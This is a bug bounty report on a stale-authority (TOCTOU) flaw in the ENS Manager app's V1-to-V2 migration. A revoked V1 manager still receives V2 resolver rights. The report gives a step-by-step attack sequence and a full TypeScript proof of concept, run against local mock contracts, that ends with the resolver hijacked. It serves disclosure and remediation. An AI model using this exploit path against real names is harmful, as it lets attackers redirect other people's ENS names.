# 89356 w a medium toctou in v1 to v2 manager validation enables ens resolver hijacking by a revoked manager

**Submitted on Aug 18th 2026 at 19:17:42 UTC by @Ailenia for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89356
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow

## Description

### Brief/Intro

The Manager app decides which V1 manager should receive V2 resolver authority from a previously fetched domain snapshot, then reuses that address when migration executes without comparing it to the live V1 Registry owner. If the registrant reclaims the V1 name after the snapshot but before submitting the migration, the flow migrates the name to the registrant and grants the revoked account persistent `ROLE_SET_RESOLVER`. The revoked account can then replace the migrated name's resolver with an attacker-controlled resolver.

### Vulnerability Details

The affected asset is `apps/manager` at commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`.

The root cause is a time-of-check/time-of-use gap in the in-scope migration flow. The V1 contracts and subgraph do not need to malfunction: they supply an initially correct snapshot, but the Manager app later uses that old authority value for a privileged V2 grant without live revalidation.

{% stepper %}
{% step %}

## Obtain the V1 migration inventory

`apps/manager/src/features/migration/hooks/useV1Names.ts` obtains the V1 migration inventory, including `domain.owner`, from `getV1NamesForAddress()`.
{% endstep %}

{% step %}

## Select domains and build a migration plan

`apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts` selects domains from that snapshot and builds a `MigrationPlan`. Its query identity includes sorted domain IDs but not the security-relevant manager address.
{% endstep %}

{% step %}

## Classify the snapshot

`apps/manager/src/features/migration/service/buildMigrationPlan.ts` classifies the snapshot. For an unwrapped `.eth` registration, a V1 Registry owner different from the registrant becomes `managerAddress`.
{% endstep %}

{% step %}

## Start the migration

`apps/manager/src/features/migration/pages/MigrationPage.tsx` passes the completed plan to `migration.start()`.
{% endstep %}

{% step %}

## Build execution batches from stale plan values

`apps/manager/src/features/migration/service/migrationService.ts` refreshes migration approvals and V2 routes, but it builds execution batches from the old `plan.classified` values. It does not read the live V1 Registry owner before submission.
{% endstep %}

{% step %}

## Grant the stale manager role

`apps/manager/src/features/migration/service/buildRoleGrantCalls.ts` encodes `ETHRegistry.grantRoles(resource, 1 << 24, managerAddress)`. `buildAtomicMigrationBatches.ts` places this grant after migration in the same HCA owner execution.
{% endstep %}

{% step %}

## Verify against the stale plan

`apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts` verifies that the planned address received the role, so verification accepts the unintended grant rather than detecting that the address was revoked in V1.
{% endstep %}
{% endstepper %}

The security-relevant production call construction is:

```typescript
args: [resource, ROLE_SET_RESOLVER, name.managerAddress]
```

The atomic order is:

```typescript
return [
  ...helperExecutions,
  ...executionsForPhase('manager-role-grant'),
]
```

The vulnerable window is any interval between authority snapshot/plan creation and atomic submission in which the live V1 manager changes. This report does not rely on a fixed cache duration.

#### Preconditions

* The victim is the V1 Base Registrar registrant of an unwrapped `.eth` name.
* A different account A is initially the V1 Registry manager, so the Manager app legitimately records A as the manager to restore.
* After the plan is created, the victim reclaims the V1 Registry node from A and then continues the already-started migration flow.

#### Attack sequence

{% stepper %}
{% step %}

## Create the migration plan

The victim opens the normal V1-to-V2 migration flow while A is the V1 Registry owner and selects the name. The plan records `managerAddress = A`.
{% endstep %}

{% step %}

## Revoke the V1 manager

Before the atomic migration is submitted, the victim calls V1 Base Registrar `reclaim(labelhash, victim)`. The live V1 Registry now names the victim as manager, and A can no longer call V1 `setResolver()`.
{% endstep %}

{% step %}

## Continue migration with the stale plan

The victim continues the migration. The app revalidates approvals and routes but does not revalidate the planned manager.
{% endstep %}

{% step %}

## Execute the migration and role grant

The HCA executes `MigrationHelper.migrate(...)` followed by `ETHRegistry.grantRoles(canonicalId, 16777216, A)`.
{% endstep %}

{% step %}

## Remove temporary approval

The app removes the HCA's temporary operator approval. A's per-name `ROLE_SET_RESOLVER` remains.
{% endstep %}

{% step %}

## Hijack the resolver

A calls V2 `setResolver()` and points the victim's migrated name to an attacker-controlled resolver.
{% endstep %}
{% endstepper %}

### Known-issue distinction

Official Known Issue QA-01 concerns role combinations during transfers that later cause functional errors when updating records or setting a primary name.

This finding concerns a migration-time authority snapshot, a revoked former manager receiving a new V2 role, and a demonstrated resolver takeover. QA-01 expressly states that a role combination granting unintended authority is a new finding.

## Impact Details

I reread the scope and the impact seems Critical with "Hijacking or bricking an ENS name during a Manager flow," including "a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker."

After the victim has revoked A in V1, the Manager migration grants A persistent V2 resolver authority. Bit 24 (`1 << 24`, decimal `16777216`) is `ROLE_SET_RESOLVER`, which permits changing the resolver for that name. `A` can redirect the migrated name's resolution and resolver-controlled records even though the V2 owner remains the victim. Removing the HCA's temporary operator approval does not remove A's per-name role.

I am honest: the victim must revoke an existing manager during the snapshot-to-submission interval and still complete the migration. But, once triggered, the in-scope Manager flow assigns resolver authority to an account that is no longer authorized, matching the published Critical impact directly.

## Recommended Remediation

Immediately before constructing or submitting each atomic batch, read the live V1 Registry owner for every planned manager restoration and compare it with the plan's `managerAddress`. If any authority value changed, abort the batch, invalidate the V1 inventory and gas-estimate queries, and require the user to review a rebuilt plan. Include the manager address in the plan/query identity as defense in depth. Post-state verification should compare granted manager roles with the live pre-submission authority set instead of only confirming the old plan.

## References

* `apps/manager/src/features/migration/hooks/useV1Names.ts`
* `apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts`
* `apps/manager/src/features/migration/pages/MigrationPage.tsx`
* `apps/manager/src/features/migration/service/buildMigrationPlan.ts`
* `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts`
* `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts`
* `apps/manager/src/features/migration/service/migrationService.ts`
* `apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts`

## Link to Proof of Concept

<https://gist.github.com/niafreu/42842e07835157cae2a78213896bb1b8>

## Proof of Concept

The PoC starts Anvil, compiles minimal interface-faithful V1 and V2 authority fixtures, and drives them with the pinned Manager application's real classifier, atomic migration batch builder, post-state verifier, and resolver-call builder.

Use Node.js 22 and materialize the pinned dependencies from the local pnpm store if needed:

```bash
corepack pnpm@10.27.0 --dir repos/audit-comp-ens install --offline --frozen-lockfile
```

Run the PoC from the campaign workspace root:

```bash
corepack pnpm@10.27.0 --dir audit-comp-ens/apps/manager exec vitest run --disableConsoleIntercept --reporter=verbose --config ../../../../pocs/finding-ddb283b4b610/vitest.config.ts
```

The test works with this sequence:

{% stepper %}
{% step %}

## Establish initial authority

The victim owns the V1 Base Registrar registration while A is the V1 Registry manager.
{% endstep %}

{% step %}

## Record the manager in the classification

The Manager classifier records A as `managerAddress`.
{% endstep %}

{% step %}

## Reclaim the V1 Registry node

The victim reclaims the live V1 Registry node, and A's V1 resolver update is rejected.
{% endstep %}

{% step %}

## Build the stale migration batch

The Manager's production batch builder emits `migrate` followed by `grantRoles(canonicalId, 16777216, A)` from the old classification.
{% endstep %}

{% step %}

## Execute the batch

The batch executes on local Anvil. The V2 owner is the victim, while A receives `ROLE_SET_RESOLVER`.
{% endstep %}

{% step %}

## Remove temporary HCA approval

The HCA's temporary operator approval is removed, but A's role persists.
{% endstep %}

{% step %}

## Verify post-state

The production post-state verifier accepts all expectations, including the stale manager role.
{% endstep %}

{% step %}

## Replace the V2 resolver

A submits a Manager-built resolver call and changes the V2 resolver to the attacker-selected address.
{% endstep %}
{% endstepper %}

Expected result:

```
atomicPhases: ["migrate", "manager-role-grant"]
decodedGrant.functionName: "grantRoles"
decodedGrant.roleBitmap: "16777216"
liveV1ManagerBeforeMigration: victim
revokedManagerV1ResolverAttempt: reverted
v2Owner: victim
managerRoleAfterMigration: true
managerRoleAfterHcaCleanup: true
all verifier expectations: satisfied
resolverAfterAttack: attacker-selected resolver
Test Files  1 passed (1)
Tests       1 passed (1)
```

Attached PoC files in the gist: <https://gist.github.com/niafreu/42842e07835157cae2a78213896bb1b8>

* `README.md`
* `cached-manager-local-chain.poc.test.ts`
* `MockAuthorityLifecycle.sol`
* `vitest.config.ts`
* `evidence.md`

```typescript
import { type ChildProcess, execFileSync, spawn } from "node:child_process";
import { readFileSync } from "node:fs";
import {
	type Abi,
	type Address,
	createPublicClient,
	createTestClient,
	createWalletClient,
	decodeFunctionData,
	getAddress,
	type Hex,
	http,
	labelhash,
	namehash,
} from "viem";
import { sepolia } from "viem/chains";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { ETH_REGISTRY_V2_ABI } from "../../repos/audit-comp-ens/apps/manager/src/features/migration/contracts/abis";
import { V2_CONTRACTS } from "../../repos/audit-comp-ens/apps/manager/src/features/migration/contracts/addresses";
import { buildAtomicMigrationBatches } from "../../repos/audit-comp-ens/apps/manager/src/features/migration/service/buildAtomicMigrationBatches";
import { classifyName } from "../../repos/audit-comp-ens/apps/manager/src/features/migration/service/classifyNames";
import type { DirectMigrationRoute } from "../../repos/audit-comp-ens/apps/manager/src/features/migration/service/directMigrationRoutes";
import type { V1Domain } from "../../repos/audit-comp-ens/apps/manager/src/features/migration/service/v1SubgraphClient";
import { verifyAtomicMigrationBatch } from "../../repos/audit-comp-ens/apps/manager/src/features/migration/service/verifyAtomicMigrationBatch";
import { buildSetResolverCall } from "../../repos/audit-comp-ens/apps/manager/src/features/profile/service/changeResolver";

const RPC_PORT = 18_545;
const RPC_URL = `http://127.0.0.1:${RPC_PORT}`;
const ROLE_SET_RESOLVER = 1n << 24n;
const LABEL = "stale-manager-poc";
const NAME = `${LABEL}.eth`;

type ContractArtifact = {
	readonly abi: Abi;
	readonly bytecode: Hex;
	readonly deployedBytecode: Hex;
};

type SolcOutput = {
	readonly errors?: readonly {
		readonly severity: string;
		readonly formattedMessage: string;
	}[];
	readonly contracts: Record<
		string,
		Record<
			string,
			{
				readonly abi: Abi;
				readonly evm: {
					readonly bytecode: { readonly object: string };
					readonly deployedBytecode: { readonly object: string };
				};
			}
		>
	>;
};

const prefixedHex = (value: string): Hex => `0x${value}`;

const compileFixture = (): Record<string, ContractArtifact> => {
	const source = readFileSync(
		new URL("./MockAuthorityLifecycle.sol", import.meta.url),
		"utf8",
	);
	const input = {
		language: "Solidity",
		sources: { "MockAuthorityLifecycle.sol": { content: source } },
		settings: {
			optimizer: { enabled: true, runs: 200 },
			outputSelection: {
				"*": {
					"*": ["abi", "evm.bytecode.object", "evm.deployedBytecode.object"],
				},
			},
		},
	};
	const raw = execFileSync("solc", ["--standard-json"], {
		input: JSON.stringify(input),
		encoding: "utf8",
		maxBuffer: 16 * 1024 * 1024,
	});
	const output = JSON.parse(raw.slice(raw.indexOf("{"))) as SolcOutput;
	const errors =
		output.errors?.filter(({ severity }) => severity === "error") ?? [];
	if (errors.length > 0) {
		throw new Error(
			errors.map(({ formattedMessage }) => formattedMessage).join("\n"),
		);
	}
	const contracts = output.contracts["MockAuthorityLifecycle.sol"];
	if (!contracts) throw new Error("solc returned no fixture contracts");
	return Object.fromEntries(
		Object.entries(contracts).map(([name, contract]) => [
			name,
			{
				abi: contract.abi,
				bytecode: prefixedHex(contract.evm.bytecode.object),
				deployedBytecode: prefixedHex(contract.evm.deployedBytecode.object),
			},
		]),
	);
};

const waitForAnvil = async (): Promise<void> => {
	for (let attempt = 0; attempt < 100; attempt += 1) {
		try {
			const response = await fetch(RPC_URL, {
				method: "POST",
				headers: { "content-type": "application/json" },
				body: JSON.stringify({
					jsonrpc: "2.0",
					id: 1,
					method: "eth_chainId",
					params: [],
				}),
			});
			const body = (await response.json()) as { result?: string };
			if (body.result === "0xaa36a7") return;
		} catch {
			// The child process has not opened its loopback listener yet.
		}
		await new Promise((resolve) => setTimeout(resolve, 50));
	}
	throw new Error("local Anvil did not become ready");
};

const localSepolia = {
	...sepolia,
	rpcUrls: { default: { http: [RPC_URL] } },
} as const;

describe("cached V1 authority restores a revoked manager", () => {
	let anvil: ChildProcess;

	beforeAll(async () => {
		anvil = spawn(
			"anvil",
			[
				"--host",
				"127.0.0.1",
				"--port",
				String(RPC_PORT),
				"--chain-id",
				String(sepolia.id),
				"--silent",
			],
			{ stdio: ["ignore", "ignore", "pipe"] },
		);
		await waitForAnvil();
	});

	afterAll(() => {
		anvil?.kill("SIGTERM");
	});

	it("executes the stale Manager batch and lets the revoked manager replace the resolver", async () => {
		const artifacts = compileFixture();
		const v1Artifact = artifacts.MockV1Authority;
		const registryArtifact = artifacts.MockV2Registry;
		const helperArtifact = artifacts.MockMigrationHelper;
		const hcaArtifact = artifacts.MockHCA;
		if (!v1Artifact || !registryArtifact || !helperArtifact || !hcaArtifact) {
			throw new Error("missing compiled fixture artifact");
		}

		const publicClient = createPublicClient({
			chain: localSepolia,
			transport: http(RPC_URL),
		});
		const testClient = createTestClient({
			chain: localSepolia,
			mode: "anvil",
			transport: http(RPC_URL),
		});
		const walletClient = createWalletClient({
			chain: localSepolia,
			transport: http(RPC_URL),
		});
		const accounts = (await publicClient.request({
			method: "eth_accounts",
		})) as readonly Address[];
		const victim = accounts[1];
		const revokedManager = accounts[2];
		const originalResolver = accounts[3];
		const attackerResolver = accounts[4];
		if (!victim || !revokedManager || !originalResolver || !attackerResolver) {
			throw new Error("Anvil did not expose enough local accounts");
		}

		const deploy = async (
			artifact: ContractArtifact,
			args: readonly unknown[] = [],
		): Promise<Address> => {
			const hash = await walletClient.deployContract({
				account: victim,
				abi: artifact.abi,
				bytecode: artifact.bytecode,
				args,
			});
			const receipt = await publicClient.waitForTransactionReceipt({ hash });
			if (!receipt.contractAddress)
				throw new Error("deployment had no contract address");
			return receipt.contractAddress;
		};

		const v1Authority = await deploy(v1Artifact);
		const hca = await deploy(hcaArtifact, [victim]);

		await testClient.setCode({
			address: V2_CONTRACTS.ETHRegistry,
			bytecode: registryArtifact.deployedBytecode,
		});
		await testClient.setCode({
			address: V2_CONTRACTS.MigrationHelper,
			bytecode: helperArtifact.deployedBytecode,
		});

		const initializeRegistryHash = await walletClient.writeContract({
			account: victim,
			address: V2_CONTRACTS.ETHRegistry,
			abi: registryArtifact.abi,
			functionName: "initialize",
			args: [V2_CONTRACTS.MigrationHelper],
		});
		await publicClient.waitForTransactionReceipt({
			hash: initializeRegistryHash,
		});
		const initializeHelperHash = await walletClient.writeContract({
			account: victim,
			address: V2_CONTRACTS.MigrationHelper,
			abi: helperArtifact.abi,
			functionName: "initialize",
			args: [V2_CONTRACTS.ETHRegistry],
		});
		await publicClient.waitForTransactionReceipt({
			hash: initializeHelperHash,
		});

		const resource = BigInt(labelhash(LABEL)) & ~0xffffffffn;
		const registerHash = await walletClient.writeContract({
			account: victim,
			address: v1Authority,
			abi: v1Artifact.abi,
			functionName: "register",
			args: [resource, victim],
		});
		await publicClient.waitForTransactionReceipt({ hash: registerHash });
		const appointManagerHash = await walletClient.writeContract({
			account: victim,
			address: v1Authority,
			abi: v1Artifact.abi,
			functionName: "reclaim",
			args: [resource, revokedManager],
		});
		await publicClient.waitForTransactionReceipt({ hash: appointManagerHash });
		const initialResolverHash = await walletClient.writeContract({
			account: revokedManager,
			address: v1Authority,
			abi: v1Artifact.abi,
			functionName: "setResolver",
			args: [resource, originalResolver],
		});
		const initialResolverReceipt = await publicClient.waitForTransactionReceipt({
			hash: initialResolverHash,
		});
		expect(initialResolverReceipt.status).toBe("success");

		const cachedV1Manager = (await publicClient.readContract({
			address: v1Authority,
			abi: v1Artifact.abi,
			functionName: "owner",
			args: [resource],
		})) as Address;
		expect(getAddress(cachedV1Manager)).toBe(getAddress(revokedManager));

		const cachedDomain: V1Domain = {
			id: namehash(NAME),
			labelName: LABEL,
			labelhash: labelhash(LABEL),
			name: NAME,
			resolver: { address: originalResolver },
			owner: { id: cachedV1Manager },
			registrant: { id: victim },
			wrappedOwner: null,
			parent: { name: "eth", wrappedDomain: null },
			registration: {
				expiryDate: String(Math.floor(Date.now() / 1000) + 31_536_000),
			},
			wrappedDomain: null,
		};
		const classification = classifyName(cachedDomain, victim);
		if (classification?.type !== "classified") {
			throw new Error("cached V1 domain was not migration-eligible");
		}
		const classifiedManager = classification.name.managerAddress;
		if (!classifiedManager)
			throw new Error("cached manager was not classified");
		expect(getAddress(classifiedManager)).toBe(getAddress(revokedManager));
		expect(classification.name.resolverStrategy).toBe("keep-v1");

		const revokeManagerHash = await walletClient.writeContract({
			account: victim,
			address: v1Authority,
			abi: v1Artifact.abi,
			functionName: "reclaim",
			args: [resource, victim],
		});
		await publicClient.waitForTransactionReceipt({ hash: revokeManagerHash });
		const liveV1ManagerBeforeMigration = (await publicClient.readContract({
			address: v1Authority,
			abi: v1Artifact.abi,
			functionName: "owner",
			args: [resource],
		})) as Address;
		expect(getAddress(liveV1ManagerBeforeMigration)).toBe(getAddress(victim));

		const revokedV1ResolverAttemptHash = await walletClient.writeContract({
			account: revokedManager,
			address: v1Authority,
			abi: v1Artifact.abi,
			functionName: "setResolver",
			args: [resource, attackerResolver],
			gas: 100_000n,
		});
		const revokedV1ResolverAttemptReceipt =
			await publicClient.waitForTransactionReceipt({
				hash: revokedV1ResolverAttemptHash,
			});
		expect(revokedV1ResolverAttemptReceipt.status).toBe("reverted");
		const liveV1ResolverAfterRejectedAttempt = (await publicClient.readContract({
			address: v1Authority,
			abi: v1Artifact.abi,
			functionName: "resolver",
			args: [resource],
		})) as Address;
		expect(getAddress(liveV1ResolverAfterRejectedAttempt)).toBe(
			getAddress(originalResolver),
		);

		const approvalHash = await walletClient.writeContract({
			account: victim,
			address: V2_CONTRACTS.ETHRegistry,
			abi: registryArtifact.abi,
			functionName: "setApprovalForAll",
			args: [hca, true],
		});
		await publicClient.waitForTransactionReceipt({ hash: approvalHash });

		const directRoute: DirectMigrationRoute = {
			name: NAME,
			receiver: V2_CONTRACTS.UnlockedMigrationController,
			parentDependency: null,
			expectedWrapperRegistry: null,
			receiverReadiness: "migration-controller",
		};
		const plan = await buildAtomicMigrationBatches({
			chainId: sepolia.id,
			hca,
			wallet: victim,
			classified: [classification.name],
			directRoutes: new Map([[NAME, directRoute]]),
			profiles: new Map(),
			defaultResolver: V2_CONTRACTS.DefaultResolver,
			resolverDeployed: true,
			walletCoAdminGranted: true,
			maxOuterGas: 1_000_000n,
			estimateOuterGas: () => 300_000n,
		});
		const batch = plan.batches[0];
		if (!batch)
			throw new Error("Manager did not build an atomic migration batch");
		expect(batch.innerExecutions.map(({ phase }) => phase)).toEqual([
			"migrate",
			"manager-role-grant",
		]);

		const grantExecution = batch.innerExecutions.find(
			({ phase }) => phase === "manager-role-grant",
		);
		if (!grantExecution)
			throw new Error("Manager omitted the stale manager role grant");
		const decodedGrant = decodeFunctionData({
			abi: ETH_REGISTRY_V2_ABI,
			data: grantExecution.call.data,
		});
		expect(decodedGrant.functionName).toBe("grantRoles");
		expect(decodedGrant.args).toEqual([
			resource,
			ROLE_SET_RESOLVER,
			getAddress(revokedManager),
		]);
		expect(getAddress(grantExecution.call.to)).toBe(
			getAddress(V2_CONTRACTS.ETHRegistry),
		);

		const roleBeforeMigration = await publicClient.readContract({
			address: V2_CONTRACTS.ETHRegistry,
			abi: registryArtifact.abi,
			functionName: "hasRoles",
			args: [resource, ROLE_SET_RESOLVER, revokedManager],
		});
		expect(roleBeforeMigration).toBe(false);

		const migrationHash = await walletClient.sendTransaction({
			account: victim,
			to: batch.outerCall.to,
			data: batch.outerCall.data,
			value: batch.outerCall.value,
		});
		const migrationReceipt = await publicClient.waitForTransactionReceipt({
			hash: migrationHash,
		});
		expect(migrationReceipt.status).toBe("success");

		const verification = await verifyAtomicMigrationBatch({
			publicClient: publicClient as never,
			batch,
			blockNumber: migrationReceipt.blockNumber,
		});
		expect(verification.results.every(({ satisfied }) => satisfied)).toBe(true);

		const v2Owner = (await publicClient.readContract({
			address: V2_CONTRACTS.ETHRegistry,
			abi: registryArtifact.abi,
			functionName: "getOwner",
			args: [resource],
		})) as Address;
		const roleAfterMigration = await publicClient.readContract({
			address: V2_CONTRACTS.ETHRegistry,
			abi: registryArtifact.abi,
			functionName: "hasRoles",
			args: [resource, ROLE_SET_RESOLVER, revokedManager],
		});
		expect(getAddress(v2Owner)).toBe(getAddress(victim));
		expect(roleAfterMigration).toBe(true);

		const revokeHcaHash = await walletClient.writeContract({
			account: victim,
			address: V2_CONTRACTS.ETHRegistry,
			abi: registryArtifact.abi,
			functionName: "setApprovalForAll",
			args: [hca, false],
		});
		await publicClient.waitForTransactionReceipt({ hash: revokeHcaHash });
		const roleAfterCleanup = await publicClient.readContract({
			address: V2_CONTRACTS.ETHRegistry,
			abi: registryArtifact.abi,
			functionName: "hasRoles",
			args: [resource, ROLE_SET_RESOLVER, revokedManager],
		});
		expect(roleAfterCleanup).toBe(true);

		const resolverBeforeAttack = (await publicClient.readContract({
			address: V2_CONTRACTS.ETHRegistry,
			abi: registryArtifact.abi,
			functionName: "getResolver",
			args: [LABEL],
		})) as Address;
		expect(getAddress(resolverBeforeAttack)).toBe(getAddress(originalResolver));

		const attackerCall = buildSetResolverCall({
			name: NAME,
			newResolver: attackerResolver,
		});
		expect(getAddress(attackerCall.to)).toBe(
			getAddress(V2_CONTRACTS.ETHRegistry),
		);
		const resolverAttackHash = await walletClient.sendTransaction({
			account: revokedManager,
			to: attackerCall.to,
			data: attackerCall.data,
			value: attackerCall.value,
		});
		const resolverAttackReceipt = await publicClient.waitForTransactionReceipt({
			hash: resolverAttackHash,
		});
		expect(resolverAttackReceipt.status).toBe("success");

		const resolverAfterAttack = (await publicClient.readContract({
			address: V2_CONTRACTS.ETHRegistry,
			abi: registryArtifact.abi,
			functionName: "getResolver",
			args: [LABEL],
		})) as Address;
		expect(getAddress(resolverAfterAttack)).toBe(getAddress(attackerResolver));

		console.log(
			JSON.stringify(
				{
					name: NAME,
					cachedV1Manager,
					liveV1ManagerBeforeMigration,
					revokedManagerV1ResolverAttempt:
						revokedV1ResolverAttemptReceipt.status,
					liveV1ResolverAfterRejectedAttempt,
					atomicPhases: batch.innerExecutions.map(({ phase }) => phase),
					decodedGrant: {
						functionName: decodedGrant.functionName,
						resource: decodedGrant.args[0].toString(),
						roleBitmap: decodedGrant.args[1].toString(),
						account: decodedGrant.args[2],
					},
					migrationReceipt: migrationHash,
					v2Owner,
					managerRoleAfterMigration: roleAfterMigration,
					managerRoleAfterHcaCleanup: roleAfterCleanup,
					verifierResults: verification.results,
					resolverBeforeAttack,
					resolverAfterAttack,
					resolverAttackReceipt: resolverAttackHash,
				},
				null,
				2,
			),
		);
	}, 60_000);
});
```
